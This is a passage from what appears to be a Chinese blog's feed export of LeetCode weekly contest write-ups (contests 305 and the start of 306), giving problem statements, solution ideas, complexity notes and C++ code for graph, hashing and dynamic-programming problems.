<p>提示：</p>
<ul>
<li><code>n == edges.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>-1 &lt;= edges[i] &lt; n</code></li>
<li><code>edges[i] != i</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/longest-cycle-in-a-graph">https://leetcode.cn/problems/longest-cycle-in-a-graph</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>DFS
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>经典题目，解法有很多种，经典的解法如下。</li>
</ol>
<ul>
<li>拓扑排序：首先我们可以利用拓扑排序将环以外的部分去掉，剩余未访问的节点均在环上，此时我们从环上任意一点开始访问求出环的最大深度即可，当然本题每条边的出度为 $1$，计算时更为简单，只需要循环即可。</li>
<li><code>DFS</code> 标记: 参考题解：<a href="https://leetcode.cn/problems/longest-cycle-in-a-graph/solution/nei-xiang-ji-huan-shu-zhao-huan-li-yong-pmqmr/">内向基环树找环 + 利用时间戳简单实现</a>，感觉容易写错，当然可以老老实实的用拓扑排序方法，去掉非环上的所有节点。</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCycle</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = edges.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">degree</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                degree[v]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (degree[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(i);</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">int</span> nx = edges[curr];</span><br><span class="line">            <span class="keyword">if</span> (nx &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                degree[nx]--;</span><br><span class="line">                <span class="keyword">if</span> (degree[nx] == <span class="number">0</span>) &#123;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(nx);</span><br><span class="line">                    visit[nx] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visit[i]) &#123;</span><br><span class="line">                <span class="type">int</span> x = i;</span><br><span class="line">                <span class="type">int</span> dist = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(!visit[x]) &#123;</span><br><span class="line">                    visit[x] = <span class="literal">true</span>;</span><br><span class="line">                    dist++;</span><br><span class="line">                    x = edges[x];</span><br><span class="line">                &#125;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, dist);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  conttest 305</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/23/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-305"><a href="#leetcode-conttest-305" class="headerlink" title="leetcode  conttest 305"></a>leetcode  conttest 305</h2><p>上午在医院看病，赛后打卡补题，感觉确实比较简单的题目。感觉最近状态越来越差，越来越没有时间参加比赛。并且感觉题目质量确实也越来越差，没有多少高质量的题目，感觉还算<code>CF</code> 或者 <code>atcoder</code> 的题目质量高很多。</p>
<h3 id="6136-算术三元组的数目"><a href="#6136-算术三元组的数目" class="headerlink" title="6136. 算术三元组的数目"></a>6136. 算术三元组的数目</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始、严格递增 的整数数组 <code>nums</code> 和一个正整数 <code>diff</code> 。如果满足下述全部条件，则三元组 <code>(i, j, k)</code> 就是一个 算术三元组 ：</p>
<ul>
<li><code>i &lt; j &lt; k</code> ，</li>
<li><code>nums[j] - nums[i] == diff</code> 且</li>
<li><code>nums[k] - nums[j] == diff</code><br>返回不同 算术三元组 的数目。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1,4,6,7,10], diff = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">(1, 2, 4) 是算术三元组：7 - 4 == 3 且 4 - 1 == 3 。</span><br><span class="line">(2, 4, 5) 是算术三元组：10 - 7 == 3 且 7 - 4 == 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,5,6,7,8,9], diff = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">(0, 2, 4) 是算术三元组：8 - 6 == 2 且 6 - 4 == 2 。</span><br><span class="line">(1, 3, 5) 是算术三元组：9 - 7 == 2 且 7 - 5 == 2 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>3 &lt;= nums.length &lt;= 200</code></li>
<li><code>0 &lt;= nums[i] &lt;= 200</code></li>
<li><code>1 &lt;= diff &lt;= 50</code></li>
<li><code>nums</code> 严格 递增</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-arithmetic-triplets/">https://leetcode.cn/problems/number-of-arithmetic-triplets/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希表 + 双指针
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，遍历每个一个 $x$, 由于数组 $nums$ 中每个元素都不相等，因此我们可以利用哈希表检测， $x + diff$ 与 $x + 2 \times diff$ 是否同时存在于数组中。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>直接遍历<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">arithmeticTriplets</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> diff)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(nums[i] + diff) &amp;&amp; cnt.<span class="built_in">count</span>(nums[i] + <span class="number">2</span> * diff)) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>双指针解法：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">arithmeticTriplets</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> diff)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] + <span class="number">2</span> * diff &lt; x) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + <span class="number">2</span> * diff &gt; x) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (nums[j] + diff &lt; x) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[j] + diff &gt; x) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[j] + diff == x) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6139-受限条件下可到达节点的数目"><a href="#6139-受限条件下可到达节点的数目" class="headerlink" title="6139. 受限条件下可到达节点的数目"></a>6139. 受限条件下可到达节点的数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>现有一棵由 <code>n</code> 个节点组成的无向树，节点编号从 <code>0</code> 到 <code>n - 1</code> ，共有 <code>n - 1</code> 条边。</p>
<p>给你一个二维整数数组 <code>edges</code> ，长度为 <code>n - 1</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示树中节点 <code>ai</code> 和 <code>bi</code> 之间存在一条边。另给你一个整数数组 <code>restricted</code> 表示 受限 节点。</p>
<p>在不访问受限节点的前提下，返回你可以从节点 <code>0</code> 到达的 最多 节点数目。</p>
<p>注意，节点 <code>0</code> 不 会标记为受限节点。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 7, edges = [[0,1],[1,2],[3,1],[4,0],[0,5],[5,6]], restricted = [4,5]</span><br><span class="line">输出：4</span><br><span class="line">解释：上图所示正是这棵树。</span><br><span class="line">在不访问受限节点的前提下，只有节点 [0,1,2,3] 可以从节点 0 到达。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 7, edges = [[0,1],[0,2],[0,5],[0,4],[3,2],[6,5]], restricted = [4,2,1]</span><br><span class="line">输出：3</span><br><span class="line">解释：上图所示正是这棵树。</span><br><span class="line">在不访问受限节点的前提下，只有节点 [0,5,6] 可以从节点 0 到达。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li><code>edges</code> 表示一棵有效的树</li>
<li><code>1 &lt;= restricted.length &lt; n</code></li>
<li><code>1 &lt;= restricted[i] &lt; n</code></li>
<li><code>restricted</code> 中的所有值 互不相同</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/reachable-nodes-with-restrictions">https://leetcode.cn/problems/reachable-nodes-with-restrictions</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>广度有限搜索或者深度有限搜索
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉这个题目可以算是一个简单题目，直接<code>BFS</code>即可，非常简单的题目。我们直接从 <code>0</code> 点开始遍历，遇到不可达的点则返回。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, vector&lt;<span class="type">int</span>&gt;&amp; restricted)</span> </span>&#123;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : restricted) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;v : edges) &#123;</span><br><span class="line">            adj[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            adj[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        visit[<span class="number">0</span>] =<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            ans++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : adj[curr]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (visit[v]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(v)) <span class="keyword">continue</span>;</span><br><span class="line">                visit[v] = <span class="literal">true</span>;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2369-检查数组是否存在有效划分"><a href="#2369-检查数组是否存在有效划分" class="headerlink" title="2369. 检查数组是否存在有效划分"></a>2369. 检查数组是否存在有效划分</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> ，你必须将数组划分为一个或多个 连续 子数组。</p>
<p>如果获得的这些子数组中每个都能满足下述条件 之一 ，则可以称其为数组的一种 有效 划分：</p>
<ul>
<li>子数组 恰 由 <code>2</code> 个相等元素组成，例如，子数组 <code>[2,2]</code> 。</li>
<li>子数组 恰 由 <code>3</code> 个相等元素组成，例如，子数组 <code>[4,4,4]</code> 。</li>
<li>子数组 恰 由 <code>3</code> 个连续递增元素组成，并且相邻元素之间的差值为 <code>1</code> 。例如，子数组 <code>[3,4,5]</code> ，但是子数组 <code>[1,3,5]</code> 不符合要求。<br>如果数组 至少 存在一种有效划分，返回 <code>true</code> ，否则，返回 <code>false</code> 。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,4,4,5,6]</span><br><span class="line">输出：true</span><br><span class="line">解释：数组可以划分成子数组 [4,4] 和 [4,5,6] 。</span><br><span class="line">这是一种有效划分，所以返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,2]</span><br><span class="line">输出：false</span><br><span class="line">解释：该数组不存在有效划分。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/check-if-there-is-a-valid-partition-for-the-array">https://leetcode.cn/problems/check-if-there-is-a-valid-partition-for-the-array</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉就是非常非常常规的简单动态规划就可以搞定，设 $dp[i]$ 表示前 $i$ 个元素是否可以等效划分，则递推公式如下:<br>$$<br>dp[i] &#x3D; dp[i] | dp[i-2] \qquad if (nums[i] &#x3D; nums[i-1]) \<br>dp[i] &#x3D; dp[i] | dp[i-3] \qquad if (nums[i] &#x3D; nums[i-1], nums[i-1] &#x3D; nums[i-2]) \<br>dp[i] &#x3D; dp[i] | dp[i-2] \qquad if (nums[i] &#x3D; nums[i-1] + 1, nums[i-1] &#x3D; nums[i-2] + 1) \<br>$$<br>根据以上递推公式，直接进行动态规划求解即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">validPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="comment">/* two */</span></span><br><span class="line">            <span class="keyword">if</span> (nums[i - <span class="number">1</span>] == nums[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                dp[i] = dp[i] | dp[i - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* tree */</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">3</span> &amp;&amp; nums[i - <span class="number">1</span>] == nums[i - <span class="number">2</span>] &amp;&amp; nums[i - <span class="number">2</span>] == nums[i - <span class="number">3</span>]) &#123;</span><br><span class="line">                dp[i] = dp[i] | dp[i<span class="number">-3</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* tree */</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">3</span> &amp;&amp; nums[i - <span class="number">1</span>] - nums[i - <span class="number">2</span>] == <span class="number">1</span> &amp;&amp; nums[i - <span class="number">2</span>] - nums[i - <span class="number">3</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                dp[i] = dp[i] | dp[i<span class="number">-3</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2370-最长理想子序列"><a href="#2370-最长理想子序列" class="headerlink" title="2370. 最长理想子序列"></a>2370. 最长理想子序列</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个由小写字母组成的字符串 <code>s</code> ，和一个整数 <code>k</code> 。如果满足下述条件，则可以将字符串 <code>t</code> 视作是 理想字符串 ：</p>
<ul>
<li><code>t</code> 是字符串 <code>s</code> 的一个子序列。</li>
<li><code>t</code> 中每两个 相邻 字母在字母表中位次的绝对差值小于或等于 <code>k</code>。<br>返回 最长 理想字符串的长度。</li>
</ul>
<p>字符串的子序列同样是一个字符串，并且子序列还满足：可以经由其他字符串删除某些字符（也可以不删除）但不改变剩余字符的顺序得到。</p>
<p>注意：字母表顺序不会循环。例如，<code>&#39;a&#39;</code> 和 <code>&#39;z&#39;</code> 在字母表中位次的绝对差值是 <code>25</code> ，而不是 <code>1</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;acfgbd&quot;, k = 2</span><br><span class="line">输出：4</span><br><span class="line">解释：最长理想字符串是 &quot;acbd&quot; 。该字符串长度为 4 ，所以返回 4 。</span><br><span class="line">注意 &quot;acfgbd&quot; 不是理想字符串，因为 &#x27;c&#x27; 和 &#x27;f&#x27; 的字母表位次差值为 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcd&quot;, k = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：最长理想字符串是 &quot;abcd&quot; ，该字符串长度为 4 ，所以返回 4 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>0 &lt;= k &lt;= 25</code></li>
<li><code>s</code> 由小写英文字母组成</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/longest-ideal-subsequence">https://leetcode.cn/problems/longest-ideal-subsequence</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉只能算是中等题目吧，设 $dp[i][j]$ 表示前 $i$ 个字母中且以字母 $j$ 为结尾最长理想字符串的长度，此时我们可以知道如下递推公式:<br>$$<br>dp[i][j] &#x3D; \max(dp[i][j], dp[i-1][k] + 1) \qquad if( |j - k| \le k)<br>$$<br>且满足 $|j-k| \le k$ 满足即可。非常简单的动态规划。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n |\Sigma|)$，$n$ 表示字符串的长度，$|\Sigma|$ 表示字符集，在这里 $|\Sigma| &#x3D; 26$。</li>
<li>空间复杂度：$O(n |\Sigma|)$，$n$ 表示字符串的长度，$|\Sigma|$ 表示字符集，在这里 $|\Sigma| &#x3D; 26$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestIdealString</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = s[i - <span class="number">1</span>] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            dp[i] = dp[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) &#123;</span><br><span class="line">                <span class="type">int</span> d = <span class="built_in">abs</span>(x - j);</span><br><span class="line">                <span class="keyword">if</span> (d &lt;= k) &#123;</span><br><span class="line">                    dp[i][x] = <span class="built_in">max</span>(dp[i][x], dp[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp[n].<span class="built_in">begin</span>(), dp[n].<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  conttest 306</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/24/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-306"><a href="#leetcode-conttest-306" class="headerlink" title="leetcode  conttest 306"></a>leetcode  conttest 306</h2><p>本周的题目确实不是特别难，后来看答案才知道，第三题和第四题都是之前的原题。前两题确实太水了，质量下滑厉害。</p>
<h3 id="6148-矩阵中的局部最大值"><a href="#6148-矩阵中的局部最大值" class="headerlink" title="6148. 矩阵中的局部最大值"></a>6148. 矩阵中的局部最大值</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个大小为 <code>n x n</code> 的整数矩阵 <code>grid</code> 。</p>
<p>生成一个大小为 <code>(n - 2) x (n - 2)</code> 的整数矩阵  <code>maxLocal</code> ，并满足：</p>
<p><code>maxLocal[i][j]</code> 等于 <code>grid</code> 中以 <code>i + 1</code> 行和 <code>j + 1</code> 列为中心的 <code>3 x 3</code> 矩阵中的 最大值 。<br>换句话说，我们希望找出 <code>grid</code> 中每个 <code>3 x 3</code> 矩阵中的最大值。</p>
<p>返回生成的矩阵。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[9,9,8,1],[5,6,2,6],[8,2,6,4],[6,2,2,2]]</span><br><span class="line">输出：[[9,9],[8,6]]</span><br><span class="line">解释：原矩阵和生成的矩阵如上图所示。</span><br><span class="line">注意，生成的矩阵中，每个值都对应 grid 中一个相接的 3 x 3 矩阵的最大值。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,1,1,1,1],[1,1,1,1,1],[1,1,2,1,1],[1,1,1,1,1],[1,1,1,1,1]]</span><br><span class="line">输出：[[2,2,2],[2,2,2],[2,2,2]]</span><br><span class="line">解释：注意，2 包含在 grid 中每个 3 x 3 的矩阵中。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
